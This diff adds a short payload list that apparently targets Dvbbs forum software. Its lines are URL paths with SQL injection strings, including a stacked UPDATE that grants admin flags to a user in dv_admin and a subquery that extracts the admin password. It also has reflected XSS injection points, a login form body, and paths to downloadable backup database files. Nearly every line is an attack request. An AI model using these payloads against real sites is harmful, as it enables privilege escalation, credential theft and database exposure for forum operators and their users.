@@ -1,0 +1,13 @@
+/UserPay.asp?raction=alipay_return&out_trade_no=1''
+/Admin/help.asp?action=view&id=1;update/**/dv_admin/**/set/**/flag=''1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45''/**/where/**/username=''akai''--
+/password=123123&codestr=71&CookieDate=2&userhidden=2&comeurl=index.asp&submit=%u7ACB%u5373%u767B%u5F55&ajaxPost=1&am
+/userpay.asp?raction=alipay_return&out_trade_no=2008011317201363527b64cea5f
+/Dv_plus/myspace/script/filemange.asp
+/dispbbs.php?boardid=2&id=1&page=1&setStmt=,title=(select%20password%20from%20dv_admin)
+/boardhelp.php?boardid=0">[XSS]
+/forum_savvy.php?boardid=16">[XSS]
+/boardstat.php?boardid=0">[XSS]
+/prompt.aspx?GetPdoUrl=[XSS]
+/Databackup/dvbbs7.MDB
+/Databackup/dvbbs7.MDB
+/Data/dvbbs7.MDB
